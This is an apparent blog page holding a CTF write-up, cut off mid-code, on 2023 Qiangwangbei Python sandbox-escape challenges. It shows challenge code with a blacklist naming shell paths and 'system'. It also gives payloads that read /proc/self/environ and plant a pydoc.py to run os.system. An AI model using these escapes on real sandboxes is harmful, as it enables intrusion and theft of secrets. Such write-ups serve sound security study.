@@ -1,0 +1,1129 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head><!-- hexo injector head_begin start --><script defer src="/injector/toolbox.js"></script><!-- hexo injector head_begin end -->
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/apple-touch-icon.png">
+  <link rel="icon" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Tr0y">
+  <meta name="keywords" content="Tr0y, tr0y, Hexo, Blog, 博客, 信息安全">
+  
+    <meta name="description" content="上周的强网杯 2023 没准备参加，一个是去年帮忙打 ctf 打得实在是有点累了；第二个是上周末有其他比赛冲突了，所以也没时间看题。偶然在公众号推送上看到了强网杯的 wp 提到了有几道 python 题，还是忍不住来玩一玩。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023 强网杯三道 pyjail 的题解">
+<meta property="og:url" content="https://www.tr0y.wang/2023/12/22/qwb2023-pyjail/">
+<meta property="og:site_name" content="Tr0y&#39;s Blog">
+<meta property="og:description" content="上周的强网杯 2023 没准备参加，一个是去年帮忙打 ctf 打得实在是有点累了；第二个是上周末有其他比赛冲突了，所以也没时间看题。偶然在公众号推送上看到了强网杯的 wp 提到了有几道 python 题，还是忍不住来玩一玩。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/ctf.jpg/cover">
+<meta property="article:published_time" content="2023-12-22T19:00:00.000Z">
+<meta property="article:modified_time" content="2024-04-12T08:00:30.000Z">
+<meta property="article:author" content="Tr0y">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/ctf.jpg/cover">
+  
+  
+  
+  <title>2023 强网杯三道 pyjail 的题解 - Tr0y&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/my.css">
+<link rel="stylesheet" href="/css/my-piczoom.css">
+<link rel="stylesheet" href="/css/my-code.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.tr0y.wang","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":60,"cursorChar":"丨","loop":false,"scope":["archives","post","tags","categories","about","links","page","404"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"🌧"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":5},"lazyload":{"enable":true,"loading_img":"https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":"8e9bf819abf5fa586aeb29b27a17930f","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"HvSx6ik6SYrERWriMqKHJgxY-gzGzoHsz","app_key":"Ehx7kqAi6icjCXaw5jdD5sIs","server_url":"https://hvsx6ik6.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?8e9bf819abf5fa586aeb29b27a17930f";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start --><script defer src="/injector/post.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Tr0y's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tr0y&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-books"></i>
+                生命线
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-archive-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/gallery/">
+                <i class="iconfont icon-images"></i>
+                摄影集
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/page.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2023 强网杯三道 pyjail 的题解"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-12-22 19:00" pubdate>
+          2023年12月22日 19:00:00
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          11k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          68 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="经验总结"
+        id="heading-14f81b61393e65e2be86c2b4bcc0434a" role="tab" data-toggle="collapse" href="#collapse-14f81b61393e65e2be86c2b4bcc0434a"
+        aria-expanded="true"
+      >
+        经验总结
+        <span class="list-group-count">(85)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-14f81b61393e65e2be86c2b4bcc0434a"
+           role="tabpanel" aria-labelledby="heading-14f81b61393e65e2be86c2b4bcc0434a">
+        
+        
+          
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2021/12/31/2021/" title="2021 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2021 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/01/12/flag-in-2021/" title="2021，来立些 flag 吧"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2021，来立些 flag 吧</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/01/31/2022/" title="2022 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2022 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2024/03/15/2023/" title="2023 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2023 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2024/05/06/%E4%BA%91%E5%8D%97%E4%B9%8B%E6%97%85/" title="2024 云南之旅"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 云南之旅</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2025/03/14/2024/" title="2024 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2025/02/20/%E6%96%90%E6%B5%8E%E4%B9%8B%E6%97%85/" title="2024 🇫🇯 斐济之旅"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 🇫🇯 斐济之旅</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2019/06/02/CSRF%E6%8C%87%E5%8C%97/" title="CSRF 指北"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CSRF 指北</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2017/06/07/CtfMiscStega/" title="CTF 杂项之隐写术"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CTF 杂项之隐写术</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2020/09/14/DNS-1-basic/" title="DNS 安全（一）：基础知识复习"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">DNS 安全（一）：基础知识复习</span>
+        </a>
+      
+    
+      
+      
+        <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="list-group-item list-group-item-action">
+          <span class="category-post">More...</span>
+        </a>
+        
+  </div>
+
+          
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="过程记录"
+        id="heading-82bd63cbf8d855f8a95d66283f2e4114" role="tab" data-toggle="collapse" href="#collapse-82bd63cbf8d855f8a95d66283f2e4114"
+        aria-expanded="true"
+      >
+        过程记录
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-82bd63cbf8d855f8a95d66283f2e4114"
+           role="tabpanel" aria-labelledby="heading-82bd63cbf8d855f8a95d66283f2e4114">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2023/12/22/qwb2023-pyjail/" title="2023 强网杯三道 pyjail 的题解"
+           class="list-group-item list-group-item-action
+           active">
+          <span class="category-post">2023 强网杯三道 pyjail 的题解</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="过程记录"
+        id="heading-82bd63cbf8d855f8a95d66283f2e4114" role="tab" data-toggle="collapse" href="#collapse-82bd63cbf8d855f8a95d66283f2e4114"
+        aria-expanded="true"
+      >
+        过程记录
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-82bd63cbf8d855f8a95d66283f2e4114"
+           role="tabpanel" aria-labelledby="heading-82bd63cbf8d855f8a95d66283f2e4114">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2023/12/22/qwb2023-pyjail/" title="2023 强网杯三道 pyjail 的题解"
+           class="list-group-item list-group-item-action
+           active">
+          <span class="category-post">2023 强网杯三道 pyjail 的题解</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">2023 强网杯三道 pyjail 的题解</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：1 年前
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>上周的强网杯 2023 没准备参加，一个是去年帮忙打 ctf 打得实在是有点累了；第二个是上周末有其他比赛冲突了，所以也没时间看题。偶然在公众号推送上看到了强网杯的 wp 提到了有几道 python 题，还是忍不住来玩一玩。</p>
+<span id="more"></span>
+<p>不确定有没有遗漏，好像一共是三道 python 题目，并且都是 pyjail 类型的。自从上次我写了那篇《Python 沙箱逃逸的通解探索之路》之后，感觉很多同类题目都可以秒了，似乎一直都没有更极限的题目出现了，这次不妨一起来看看这次强网杯会不会让人眼前一亮呢。</p>
+<h2 id="pyjail-its-myfilter">Pyjail: It's myFILTER!!!</h2>
+<p>题目代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> code, os, subprocess<br><span class="hljs-keyword">import</span> pty<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">blacklist_fun_callback</span>(<span class="hljs-params">*args</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Player! It&#x27;s already banned!&quot;</span>)<br><br><br>pty.spawn = blacklist_fun_callback<br>os.system = blacklist_fun_callback<br>os.popen = blacklist_fun_callback<br>subprocess.Popen = blacklist_fun_callback<br>subprocess.call = blacklist_fun_callback<br>code.interact = blacklist_fun_callback<br>code.compile_command = blacklist_fun_callback<br><br><span class="hljs-built_in">vars</span> = blacklist_fun_callback<br>attr = blacklist_fun_callback<br><span class="hljs-built_in">dir</span> = blacklist_fun_callback<br><span class="hljs-built_in">getattr</span> = blacklist_fun_callback<br><span class="hljs-built_in">exec</span> = blacklist_fun_callback<br><span class="hljs-built_in">__import__</span> = blacklist_fun_callback<br><span class="hljs-built_in">compile</span> = blacklist_fun_callback<br><span class="hljs-built_in">breakpoint</span> = blacklist_fun_callback<br><br><span class="hljs-keyword">del</span> os, subprocess, code, pty, blacklist_fun_callback<br>input_code = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Can u input your code to escape &gt; &quot;</span>)<br><br>blacklist_words = [<span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;code&#x27;</span>, <span class="hljs-string">&#x27;interact&#x27;</span>, <span class="hljs-string">&#x27;pty&#x27;</span>, <span class="hljs-string">&#x27;pdb&#x27;</span>, <span class="hljs-string">&#x27;platform&#x27;</span>, <span class="hljs-string">&#x27;importlib&#x27;</span>, <span class="hljs-string">&#x27;timeit&#x27;</span>, <span class="hljs-string">&#x27;imp&#x27;</span>, <span class="hljs-string">&#x27;commands&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;load_module&#x27;</span>, <span class="hljs-string">&#x27;spawn&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;/bin/sh&#x27;</span>, <span class="hljs-string">&#x27;/bin/bash&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;input&#x27;</span>, <span class="hljs-string">&#x27;vars&#x27;</span>, <span class="hljs-string">&#x27;attr&#x27;</span>, <span class="hljs-string">&#x27;dir&#x27;</span>, <span class="hljs-string">&#x27;getattr&#x27;</span>, <span class="hljs-string">&#x27;__import__&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;__getattribute__&#x27;</span>, <span class="hljs-string">&#x27;__class__&#x27;</span>, <span class="hljs-string">&#x27;__base__&#x27;</span>, <span class="hljs-string">&#x27;__subclasses__&#x27;</span>, <span class="hljs-string">&#x27;__getitem__&#x27;</span>, <span class="hljs-string">&#x27;__self__&#x27;</span>, <span class="hljs-string">&#x27;__globals__&#x27;</span>, <span class="hljs-string">&#x27;__init__&#x27;</span>, <span class="hljs-string">&#x27;__name__&#x27;</span>, <span class="hljs-string">&#x27;__dict__&#x27;</span>, <span class="hljs-string">&#x27;._module&#x27;</span>, <span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;breakpoint&#x27;</span>, <span class="hljs-string">&#x27;import&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_filter</span>(<span class="hljs-params">input_code</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> blacklist_words:<br>        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> input_code:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">while</span> (<br>    <span class="hljs-string">&quot;&#123;&quot;</span> <span class="hljs-keyword">in</span> input_code <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;&#125;&quot;</span> <span class="hljs-keyword">in</span> input_code <span class="hljs-keyword">and</span> input_code.isascii() <span class="hljs-keyword">and</span> my_filter(input_code) <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;eval&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> input_code <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(input_code) &lt; <span class="hljs-number">65</span><br>):<br>    input_code = <span class="hljs-built_in">eval</span>(<span class="hljs-string">f&quot;f&#x27;<span class="hljs-subst">&#123;input_code&#125;</span>&#x27;&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Player! Please obey the filter rules which I set!&quot;</span>)<br></code></pre></td></tr></table></figure>
+<p>这道题常规的解法是比较简单的，一眼扫过去，基础 exp 的 <code>open</code> 不在过滤列表里，那当然是先尝试读一下当前目录、根目录、环境变量之类的看看有没有 flag 再说。至于回显嘛，由于我没实际在官方环境中测试，这个代码看起来像是可以直接 nc 过去做的，如果是这样的话，那利用报错或者是直接 print 结果其实都可以的。看了下网上的 wp，证明 flag 的确是在环境变量里，所以 exp 就是：<code>&#123;print(open("/proc/self/environ").read())&#125;</code>。如果是在比赛的话，到这里就结束了，赶紧下一道吧。</p>
+<p>但作为黑客，实现 RCE 是永远的诱惑。这道题莫非只能读文件么？</p>
+<h3 id="分析">分析</h3>
+<p>我们先来分析一下这里的限制条件：</p>
+<p>（做的过程中发现出题人在写 <code>blacklist_words</code> 的时候，<code>"getattr" "__import__",</code> 之间漏了一个 <code>,</code>，这直接导致 blacklist_words 中没有 <code>getattr</code> 和 <code>__import__</code>，不知道是不是故意的，不过这里我们就当这里有逗号好了。）</p>
+<h4 id="内置模块的方法劫持">内置模块的方法劫持</h4>
+<p>首先，由于 <code>os.system</code> 等内置模块的方法被劫持到 <code>blacklist_fun_callback</code> 了，所以即使我们 exp 中可以 <code>import os</code>，拿到的 <code>os.system</code> 也依旧是 <code>blacklist_fun_callback</code>，原因在于橘友们小学 5 年级就知道的 Python 模块导入的缓存机制。为了确保模块单例以及支持模块重用机制，在执行 import 的时候，如果模块是第一次导入，python 会在导入模块的同时把模块名称保存在 <code>sys.modules</code> 这个字典里；如果在导入模块的时候发现它已经在这个字典里了，就会直接返回 <code>sys.modules</code> 中模块对应的值。在这个缓存机制的影响下，题目中修改了众多内置模块的方法，比如 <code>subprocess.Popen</code>，那就意味着后续所有代码中间接使用到的 <code>subprocess.Popen</code> 也会被劫持。例如，橘友们小学 5 年级就知道 <code>help()</code> 可以用来做 python 沙箱逃逸，原因是因为背后执行了 <code>more</code>，在 more 里可以用 <code>!</code> 来执行任意命令，比如 <code>!id</code>。但可能少为人知的是，<code>help()</code> 背后是 <code>pydoc</code>，在 <code>pydoc.py</code> 中使用了 <code>subprocess.Popen</code> 或者 <code>os.system</code>（win 平台）</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/qwb2023-pyjail/329c2d4f-97de-4299-94fa-31b1864fc03c.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>如果要解决这个问题，最简单的方式就是删除 <code>sys.modules</code> 中的 <code>subprocess</code>，然后重新 import 一次。</p>
+<h4 id="内置函数劫持">内置函数劫持</h4>
+<p><code>vars</code> 等内置方法也被劫持到 <code>blacklist_fun_callback</code> 了。但这里与上面不同，这个修改并不会影响其他模块的 vars。因为 python 查找变量的顺序是 LEGB 法则，因此 vars 变量的顺序是先从本地命名空间开始，然后是包含它的模块的命名空间，最后是内置命名空间。由于其他模块中没有局部或模块级别的 vars 定义，所以它们内部会使用 <code>__builtins__</code> 中的原始 vars 函数。如果我们想对内置函数做与上面相同的劫持，应该使用 <code>__builtins__.vars = blacklist_fun_callback</code>。</p>
+<p>如果想在当前上下文中恢复这些内置函数，只需要清空 <code>locals()</code> 或者 <code>globals()</code> 即可（这里它们是一个东西，因为我们的 exp 是在模块层级上执行的，因此 <code>locals()</code> 和 <code>globals()</code> 是同一个字典），这样一来，python 按照 LEGB 法则就会找到 B 的 vars。</p>
+<h4 id="其他">其他</h4>
+<p>这些相对比较常规：</p>
+<ul>
+<li>exp 中不能出现 <code>blacklist_words</code> 的所有关键字</li>
+<li><code>eval</code> 不能出现在 exp 里</li>
+<li>exp 所有字符必须全部为 ascii 码</li>
+<li>exp 长度最长为 64</li>
+</ul>
+<h3 id="思路-1常规沙箱逃逸">思路 1：常规沙箱逃逸</h3>
+<p>我们注意到代码中 <code>eval(f"f'&#123;input_code&#125;'")</code> 使用了两层 f-string，不但本身可以直接执行任意代码，也可以通过单引号来进行代码注入。这就意味着直接通过 <code>&#123;eval("1+1")&#125;</code> 来执行任意代码，但由于 blacklist_words 的限制，所以通常会想到用 Unicode 变量名，但是 while 里做了限制，此路不通；还有就是搞一个字符串出来做分隔，例如 <code>f'&#123;ev''al("1+1")&#125;'</code>，但这也有新的问题，我们为了生成 eval，又加入了 f-string，而 f-string 中如果用到 <code>&#123;&#125;</code>，则字符串必须是连续的，例如 <code>f'&#123;1*' + f'1&#125;'</code> 是会报错的。</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/qwb2023-pyjail/11c83412-ecb8-4d19-b244-43e25d64705c.png!blog#width-zoom5" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>加上其他条件的严格限制（尤其是长度和对方法进行劫持），常规沙箱逃逸的 payload 均宣告出局。同时，我也用之前写的自动化挖掘工具跑了一下，发现的确找不到：<br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/qwb2023-pyjail/9648c2e7-eb74-42b4-b90e-f074898f8ea1.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>到这里就应该换个思路了。</p>
+<h3 id="思路-2覆盖模块">思路 2：覆盖模块</h3>
+<p>虽然我们没有办法直接 import，但是通过执行内置的一些函数可以实现间接执行 import。上面提到，<code>help()</code> 由于 <code>subprocess.Popen</code> 被劫持导致无法正常执行，其实这里我们也可以用这个思路，经过代码分析，在 python 的 <code>/lib/python3.9/_sitebuiltins.py</code> 中发现有 <code>import pydoc</code>：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/qwb2023-pyjail/9128b12c-3792-4ff3-b953-6ef4be1d95e1.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>而 open 又不受限制，这就意味我们只需要在执行目录下创建一个 <code>pydoc.py</code>，往里面写要执行的代码即可实现任意代码执行，也就意味着实现了 RCE：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 首先创建文件并覆盖内容，第一批写入文件内容为</span><br><span class="hljs-comment"># __import__(&quot;importlib&quot;</span><br><span class="hljs-string">&#x27;&#x27;</span>&#123;<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;pydoc.py&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>).write(<span class="hljs-string">&#x27;__im&#x27;</span><span class="hljs-string">&#x27;port__(&quot;im&#x27;</span><span class="hljs-string">&#x27;portlib&quot;&#x27;</span>)&#125;<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-comment"># 继续写入</span><br><span class="hljs-comment"># ).reload(__import__(&quot;os&quot;</span><br><span class="hljs-string">&#x27;&#x27;</span>&#123;<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;pydoc.py&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>).write(<span class="hljs-string">&#x27;).reload(__im&#x27;</span><span class="hljs-string">&#x27;port__(&quot;o&#x27;</span><span class="hljs-string">&#x27;s&quot;&#x27;</span>)&#125;<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-comment"># 继续写入</span><br><span class="hljs-comment"># )).system(&quot;whoami&quot;)</span><br><span class="hljs-string">&#x27;&#x27;</span>&#123;<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;pydoc.py&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>).write(<span class="hljs-string">&#x27;)).sys&#x27;</span><span 